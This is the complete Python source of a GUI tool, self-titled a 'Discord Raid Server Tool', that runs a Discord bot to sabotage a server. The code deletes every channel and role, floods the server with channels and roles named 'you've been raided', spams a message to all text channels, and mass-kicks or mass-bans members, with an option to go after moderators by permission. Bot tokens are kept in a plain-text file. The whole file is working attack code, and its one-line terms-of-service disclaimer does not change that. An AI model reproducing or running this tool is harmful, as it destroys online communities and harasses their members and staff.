import discord
from discord.ext import commands
import time
import json
import threading
import tkinter as tk
from tkinter import messagebox, ttk, simpledialog
import tkinter as tk
from PIL import Image, ImageTk

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

action_running = False

TOKENS_FILE = "tokens.json"


def sleep():
    time.sleep(0.01)

def run_bot(token):
    try:
        print("Bot is starting...")
        bot.run(token)
    except Exception as e:
        print(f"Error while starting the bot: {e}")

def start_gui():
    def start_bot():
        token = bot_token_entry.get().strip()
        if token:
            threading.Thread(target=run_bot, args=(token,)).start()
            messagebox.showinfo("Bot", "The bot has been started.")
        else:
            messagebox.showerror("Error", "Please enter a valid bot token.")

    def start_creation_or_deletion(action_type, action_func, *args):
        global action_running
        action_running = True
        threading.Thread(target=action_func, args=(action_type, *args)).start()

    def stop_action():
        global action_running
        action_running = False
        messagebox.showinfo("Action Stopped", "The action has been stopped.")

    def create_channels():
        guild_id = guild_id_entry.get()
        channel_prefix = channel_prefix_entry.get() or "you've been raided"
        number_of_channels = int(number_of_channels_spinbox.get())
        channel_type = channel_type_var.get()

        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return

        if number_of_channels > 100:
            messagebox.showerror("Error", "You can create a maximum of 100 channels.")
            return

        guild = bot.get_guild(int(guild_id))
        if guild:
            start_creation_or_deletion("create", create_custom_channels, guild, channel_prefix, number_of_channels,
                                       channel_type)
            messagebox.showinfo("Success", "Creating custom channels...")
        else:
            messagebox.showerror("Error", "Cannot find the server with this ID.")

    def create_custom_channels(action_type, guild, prefix, num_channels, channel_type):
        for i in range(num_channels):
            if not action_running:
                break
            channel_name = f"{prefix}"
            if channel_type == "Text":
                bot.loop.create_task(guild.create_text_channel(name=channel_name))
                print(f"Text Channel {channel_name} created.")
            elif channel_type == "Voice":
                bot.loop.create_task(guild.create_voice_channel(name=channel_name))
                print(f"Voice Channel {channel_name} created.")
            sleep()

    def delete_channels():
        guild_id = guild_id_entry.get()
        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return

        guild = bot.get_guild(int(guild_id))
        if guild:
            start_creation_or_deletion("delete", delete_all_channels, guild)
            messagebox.showinfo("Success", "Deleting all channels...")
        else:
            messagebox.showerror("Error", "Cannot find the server with this ID.")

    def delete_all_channels(action_type, guild):
        for channel in guild.channels:
            if not action_running:
                break
            try:
                bot.loop.create_task(channel.delete())
                print(f"Channel {channel.name} deleted.")
            except discord.Forbidden:
                print(f"Skipping channel {channel.name}: Missing permissions.")
            except Exception as e:
                print(f"Error deleting channel {channel.name}: {e}")
            sleep()

    def create_roles():
        guild_id = guild_id_entry.get()
        role_prefix = role_prefix_entry.get() or "you've been raided"
        number_of_roles = int(number_of_roles_spinbox.get())
        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return

        guild = bot.get_guild(int(guild_id))
        if guild:
            start_creation_or_deletion("create", create_custom_roles, guild, role_prefix, number_of_roles)
            messagebox.showinfo("Success", "Creating custom roles...")
        else:
            messagebox.showerror("Error", "Cannot find the server with this ID.")

    def create_custom_roles(action_type, guild, prefix, num_roles):
        for i in range(num_roles):
            if not action_running:
                break
            role_name = f"{prefix}"
            bot.loop.create_task(guild.create_role(name=role_name))
            print(f"Role {role_name} created.")
            sleep()

    def delete_roles():
        guild_id = guild_id_entry.get()
        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return

        guild = bot.get_guild(int(guild_id))
        if guild:
            start_creation_or_deletion("delete", delete_all_roles, guild)
            messagebox.showinfo("Success", "Deleting all roles...")
        else:
            messagebox.showerror("Error", "Cannot find the server with this ID.")

    def delete_all_roles(action_type, guild):
        for role in guild.roles:
            if not action_running:
                break
            if role != guild.default_role:
                try:
                    bot.loop.create_task(role.delete())
                    print(f"Role {role.name} deleted.")
                except discord.Forbidden:
                    print(f"Skipping role {role.name}: Missing permissions.")
                except Exception as e:
                    print(f"Error deleting role {role.name}: {e}")
            sleep()

    def leave_server():
        guild_id = guild_id_entry.get()
        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return

        guild = bot.get_guild(int(guild_id))
        if guild:
            bot.loop.create_task(guild.leave())
            messagebox.showinfo("Success", "The bot has left the server.")
        else:
            messagebox.showerror("Error", "Cannot find the server with this ID.")

    def send_message_to_all_channels():
        message = custom_message_entry.get().strip()
        guild_id = guild_id_entry.get().strip()
        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return
        if not message:
            messagebox.showerror("Error", "Please enter a custom message.")
            return

        guild = bot.get_guild(int(guild_id))
        if guild:
            for channel in guild.text_channels:
                try:
                    bot.loop.create_task(channel.send(message))
                    print(f"Message sent to channel {channel.name}")
                except discord.Forbidden:
                    print(f"Skipping channel {channel.name}: Missing permissions.")
                except Exception as e:
                    print(f"Error sending message to channel {channel.name}: {e}")
            messagebox.showinfo("Success", "Message sent to all channels.")
        else:
            messagebox.showerror("Error", "Cannot find the server with this ID.")

    def kick_or_ban():
        guild_id = guild_id_entry.get().strip()
        action = action_var.get()
        target_staff = staff_check_var.get()
        max_members = 500

        if not guild_id:
            messagebox.showerror("Error", "Please enter a valid server ID.")
            return

        guild = bot.get_guild(int(guild_id))
        if not guild:
            messagebox.showerror("Error", "Cannot find the server with this ID.")
            return

        members = guild.members
        STAFF_PERMISSIONS = {
            "timeout_members",
            "kick_members",
            "ban_members",
            "move_members",
            "deafen_members",
            "mute_members",
            "manage_messages",
            "manage_threads",
            "manage_guild",
            "view_audit_log",
            "manage_emojis",
            "manage_soundboard",
            "manage_events",
            "administrator",
            "manage_webhooks",
        }

        def is_staff_role(role):
            return any(getattr(role.permissions, perm, False) for perm in STAFF_PERMISSIONS)

        if target_staff:
            members = [member for member in members if any(is_staff_role(role) for role in member.roles)]
        else:
            members = members[:max_members]

        for member in members:
            if action == "Kick":
                try:
                    bot.loop.create_task(member.kick(reason=""))
                    print(f"Kicked {member.name}")
                except discord.Forbidden:
                    print(f"Cannot kick {member.name}: Missing permissions.")
            elif action == "Ban":
                try:
                    bot.loop.create_task(member.ban(reason=""))
                    print(f"Banned {member.name}")
                except discord.Forbidden:
                    print(f"Cannot ban {member.name}: Missing permissions.")
            sleep()

        messagebox.showinfo("Success", f"Action {action} performed on selected members.")


    def save_token_to_file(name, token):
        try:
            tokens = {}
            try:
                with open(TOKENS_FILE, "r") as f:
                    tokens = json.load(f)
            except FileNotFoundError:
                pass

            tokens[name] = token
            with open(TOKENS_FILE, "w") as file:
                json.dump(tokens, file, indent=4)

            messagebox.showinfo("Success", f"Token '{name}' has been saved.")
        except Exception as e:
            messagebox.showerror("Error", f"Could not save token: {e}")

    def load_token_from_file():
        try:
            with open(TOKENS_FILE, "r") as f:
                tokens = json.load(f)

            if not tokens:
                messagebox.showwarning("No Tokens", "No tokens found in the file.")
                return None

            def select_token(selected_name):
                token = tokens[selected_name]
                bot_token_entry.delete(0, tk.END)
                bot_token_entry.insert(0, token)
                select_window.destroy()

            select_window = tk.Toplevel()
            select_window.title("Select a Token")
            select_window.geometry("300x200")
            select_window.configure(bg="black")

            tk.Label(select_window, text="Select a Token:", bg="black", fg="white", font=("Arial", 12, "bold")).pack(
                pady=10)

            for name in tokens:
                tk.Button(select_window, text=name, command=lambda n=name: select_token(n), bg="#09688C", fg="white",
                          font=("Arial", 10, "bold")).pack(pady=5)

            select_window.mainloop()
        except FileNotFoundError:
            messagebox.showwarning("No Tokens", "No token file found. Please save a token first.")
        except Exception as e:
            messagebox.showerror("Error", f"Could not load tokens: {e}")

    async def update_bot_status():
        activity_type = activity_var.get()
        activity_text = activity_entry.get().strip()
        status_type = status_var.get()

        activity_mapping = {
            "Playing": discord.Game(name=activity_text),
            "Listening": discord.Activity(type=discord.ActivityType.listening, name=activity_text),
            "Watching": discord.Activity(type=discord.ActivityType.watching, name=activity_text),
        }
        status_mapping = {
            "Online": discord.Status.online,
            "Idle": discord.Status.idle,
            "Do Not Disturb": discord.Status.do_not_disturb,
            "Invisible": discord.Status.invisible,
        }

        if bot.is_ready():
            await bot.change_presence(activity=activity_mapping.get(activity_type, None),
                                      status=status_mapping.get(status_type, discord.Status.online))
            print(f"Status updated: {status_type}, Activity: {activity_type} - {activity_text}")
        else:
            print("Bot is not ready yet. Cannot update status.")

    def apply_status():
        if not bot_token_entry.get().strip():
            messagebox.showerror("Error", "Please enter a valid bot token.")
            return

        if not bot.is_ready():
            messagebox.showerror("Error", "The bot has not been started yet.")
            return

        messagebox.showinfo("Success", "Status updated.")
        bot.loop.create_task(update_bot_status())

    root = tk.Tk()
    root.title("Discord Raid Server Tool   |   VoidControl Tool   |   © wivex")
    root.geometry("1200x920")
    root.configure(bg="black")

    try:
        image = Image.open("background_image.jpg")
        image = image.resize((1200, 920), Image.Resampling.LANCZOS)
        background_image = ImageTk.PhotoImage(image)

        background_label = tk.Label(root, image=background_image)
        background_label.place(relwidth=1, relheight=1)

        label = tk.Label(root, text="", font=("Arial", 20), bg="white")
        label.grid(row=0, column=0, columnspan=2, pady=20)

    except FileNotFoundError:
        print("You did not put a background image (background_image.jpg). Default background : black")

    root.columnconfigure(0, weight=1)
    root.columnconfigure(1, weight=1)

    title_label = tk.Label(root, text="VoidControl Tool", bg="black", fg="white", font=("Arial", 24, "bold"))
    title_label.grid(row=0, column=0, columnspan=2, pady=20)

    tk.Label(root, text="Do not use this tool for any activities that may violate Discord's terms of service."
             " © wivex",
             bg="black",
             fg="#D3D3D3", font=("Arial", 10, "bold")).grid(row=1, column=0, columnspan=2, pady=4)

    button_style = {"font": ("Arial", 10, "bold"), "relief": "raised"}
    start_button_style = {**button_style, "bg": "#09688C", "fg": "white", "height": 1, "width": 15}
    create_button_style = {**button_style, "bg": "#0C4A03", "fg": "white", "height": 1, "width": 15}
    send_message_button_style = {**button_style, "bg": "#0C4A03", "fg": "white", "height": 1, "width": 24}
    leave_button_style = {**button_style, "bg": "#671701", "fg": "white", "height": 1, "width": 15}
    delete_button_style = {**button_style, "bg": "#671701", "fg": "white", "height": 1, "width": 16}
    stop_button_style = {**button_style, "bg": "#734705", "fg": "white", "height": 1, "width": 15}

    tk.Label(root, text="Bot Token:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=2, column=0,
                                                                                               columnspan=2, pady=5)
    bot_token_entry = tk.Entry(root, bg="#333333", fg="white", font=("Arial", 12), show="*")
    bot_token_entry.grid(row=3, column=0, columnspan=2, pady=5, ipadx=50)

    def save_token():
        token = bot_token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Please enter a valid token before saving.")
            return

        name = tk.simpledialog.askstring("Save Token", "Enter a name for this token:")
        if name:
            save_token_to_file(name, token)

    save_token_button = tk.Button(root, text="Save Token", command=save_token, bg="#0C4A03", fg="white",
                                  font=("Arial", 10, "bold"), width=15)
    save_token_button.grid(row=3, column=0, pady=10)

    load_token_button = tk.Button(root, text="Load Token", command=load_token_from_file, bg="#09688C", fg="white",
                                  font=("Arial", 10, "bold"), width=15)
    load_token_button.grid(row=3, column=1, pady=10)

    tk.Label(root, text="Server ID:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=4, column=0, columnspan=2,
                                                                                       pady=5)
    guild_id_entry = tk.Entry(root, bg="#333333", fg="white", font=("Arial", 12))
    guild_id_entry.grid(row=5, column=0, columnspan=2, pady=5, ipadx=50)

    tk.Label(root, text="Custom Message:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=6, column=0, columnspan=2, pady=5)
    custom_message_entry = tk.Entry(root, bg="#333333", fg="white", font=("Arial", 12))
    custom_message_entry.grid(row=7, column=0, columnspan=2, pady=5, ipadx=50)

    send_message_button = tk.Button(root, text="Send Message to All Channels", command=send_message_to_all_channels,
                                    **send_message_button_style)
    send_message_button.grid(row=8, column=0, pady=10, columnspan=2)

    tk.Label(root, text="Channel Prefix:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=10, column=0, pady=5)
    channel_prefix_entry = tk.Entry(root, bg="#333333", fg="white", font=("Arial", 12))
    channel_prefix_entry.grid(row=11, column=0, pady=5)

    tk.Label(root, text="Role Prefix:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=10, column=1, pady=5)
    role_prefix_entry = tk.Entry(root, bg="#333333", fg="white", font=("Arial", 12))
    role_prefix_entry.grid(row=11, column=1, pady=5)

    tk.Label(root, text="Select Action:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=10, column=0, pady=5, columnspan=2)
    action_var = tk.StringVar()
    action_var.set("Kick")
    action_dropdown = ttk.Combobox(root, textvariable=action_var, values=["Kick", "Ban"])
    action_dropdown.grid(row=11, column=0, pady=5, columnspan=2)

    staff_check_var = tk.BooleanVar()
    def toggle_button_bg():
        if staff_check_var.get():
            staff_check_button.config(bg="green")
        else:
            staff_check_button.config(bg="white")
    staff_check_button = tk.Checkbutton( root, text="Target Staff Only", variable=staff_check_var, bg="white", fg="black", font=("Arial", 12),
                                         command=toggle_button_bg, width=12, height=1
    )
    staff_check_button.grid(row=12, column=0, pady=5, columnspan=2)

    execute_button = tk.Button(root, text="Execute Action", command=kick_or_ban, **create_button_style)
    execute_button.grid(row=13, column=0, pady=10, columnspan=2)

    tk.Label(root, text="Number of Channels:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=12, column=0,
                                                                                                pady=5)
    number_of_channels_spinbox = tk.Spinbox(root, from_=1, to=100, bg="#333333", fg="white", font=("Arial", 12),
                                            width=5)
    number_of_channels_spinbox.grid(row=13, column=0, pady=5)

    tk.Label(root, text="Number of Roles:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=12, column=1, pady=5)
    number_of_roles_spinbox = tk.Spinbox(root, from_=1, to=100, bg="#333333", fg="white", font=("Arial", 12), width=5)
    number_of_roles_spinbox.grid(row=13, column=1, pady=5)

    tk.Label(root, text="Select Channel Type:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=14, column=0,
                                                                                                 pady=5)
    channel_type_var = tk.StringVar()
    channel_type_var.set("Text")
    channel_type_dropdown = ttk.Combobox(root, textvariable=channel_type_var, values=["Text", "Voice"])
    channel_type_dropdown.grid(row=15, column=0, pady=5)

    create_channel_button = tk.Button(root, text="Create Channels", command=create_channels, **create_button_style)
    create_channel_button.grid(row=16, column=0, pady=10)

    delete_channel_button = tk.Button(root, text="Delete All Channels", command=delete_channels, **delete_button_style)
    delete_channel_button.grid(row=17, column=0, pady=10)

    create_role_button = tk.Button(root, text="Create Roles", command=create_roles, **create_button_style)
    create_role_button.grid(row=16, column=1, pady=10)

    delete_role_button = tk.Button(root, text="Delete All Roles", command=delete_roles, **delete_button_style)
    delete_role_button.grid(row=17, column=1, pady=10)

    start_button = tk.Button(root, text="Start Bot", command=start_bot, **start_button_style)
    start_button.grid(row=15, column=0, columnspan=2, pady=20)

    stop_button = tk.Button(root, text="Stop Action", command=stop_action, **stop_button_style)
    stop_button.grid(row=16, column=0, columnspan=2, pady=10)

    leave_server_button = tk.Button(root, text="Leave Server", command=leave_server, **leave_button_style)
    leave_server_button.grid(row=17, column=0, columnspan=2, pady=20)

    tk.Label(root, text="Set Activity Type:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=21, column=0,
                                                                                                       pady=5, columnspan=2)
    activity_var = tk.StringVar(value="Playing")
    activity_dropdown = ttk.Combobox(root, textvariable=activity_var,
                                     values=["Playing", "Listening", "Watching"])
    activity_dropdown.grid(row=22, column=0, pady=5, columnspan=2)

    tk.Label(root, text="Set Activity Text:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=21, column=1,
                                                                                                       pady=5, columnspan=3)
    activity_entry = tk.Entry(root, bg="#333333", fg="white", font=("Arial", 12))
    activity_entry.grid(row=22, column=1, pady=5, ipadx=50, columnspan=2)

    tk.Label(root, text="Set Online Status:", bg="black", fg="white", font=("Arial", 12, "bold")).grid(row=21, column=0,
                                                                                                       pady=5, columnspan=1)
    status_var = tk.StringVar(value="Online")
    status_dropdown = ttk.Combobox(root, textvariable=status_var,
                                   values=["Online", "Idle", "Do Not Disturb", "Invisible"])
    status_dropdown.grid(row=22, column=0, pady=5, columnspan=1)

    apply_status_button = tk.Button(root, text="Apply Status", command=apply_status, bg="#09688C", fg="white",
                                    font=("Arial", 10, "bold"))
    apply_status_button.grid(row=23, column=0, columnspan=2, pady=20)

    root.mainloop()

start_gui()
